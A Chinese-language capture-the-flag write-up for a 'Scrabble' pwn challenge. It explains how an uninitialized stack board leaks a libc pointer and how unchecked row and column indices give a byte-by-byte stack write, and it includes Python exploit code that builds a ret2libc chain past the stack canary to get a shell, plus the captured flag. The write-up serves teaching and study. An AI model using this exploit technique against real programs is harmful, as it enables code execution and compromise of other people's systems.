# Scrabble

## 题目简述

程序在栈上创建未初始化的 `char board[15][15]`，既会完整打印其中的旧栈数据，又不检查用户给出的行列下标。由此同时得到 libc 泄漏和按字节栈写原语，最终覆盖 `game` 的返回地址构造 ret2libc。

## 解题过程

写入语句是：

```c
board[r][c] = entered_char;
```

编译后地址等价于 `board + 15 * r + c`。`r`、`c` 没有边界检查，因此任意整数下标可以把一个受控字节写到 `board` 前后。与此同时，菜单每次都会打印全部 225 字节，而数组从未清零；官方运行布局中，打印区域泄漏了 libc 的 `_IO_file_jumps` 指针，据此计算：

```python
libc.address = leaked_io_file_jumps - libc.sym["_IO_file_jumps"]
```

归档服务使用固定栈布局，进入 `game` 时 `rsp` 为 `0x7fffffffd4f0`，`board` 位于 `rsp + 0x20`，返回地址位于 `rsp + 0x118`。把目标地址换算成行列的公式为：

```python
def row_col(target):
    offset = target - (0x7fffffffd4f0 + 0x20)
    return divmod(offset, 15)

def write_qword(target, value):
    for i, byte in enumerate(p64(value)):
        row, col = row_col(target + i)
        io.sendlineafter(b"Choice: ", b"1")
        io.sendlineafter(b"row: ", str(row).encode())
        io.sendlineafter(b"column: ", str(col).encode())
        io.sendlineafter(b"character: ", bytes([byte]))
```

从返回地址开始依次写入 `pop rdi; ret`、`/bin/sh`、单独的 `ret` 和 `system`。这些写入直接越过栈 canary，不需要知道 canary 值。选择菜单项 2 令 `game` 返回后即可进入 shell：

```text
grey{gg_ret2libc_is_2_eZ_4_me33eeEEE}
```

这里的固定栈地址是官方解法所依赖的部署条件；若目标启用了栈地址随机化，就还需要额外的栈泄漏，不能机械复用上述常量。

## 方法总结

未初始化内存泄漏和无符号/有符号下标越界常常可以组合成完整利用链：先从合法打印路径识别模块指针，再把二维数组寻址化成一维偏移完成精确写入。本题还说明 canary 只保护连续跨越它的溢出，能够直接寻址返回地址的任意写可以绕开该检查。
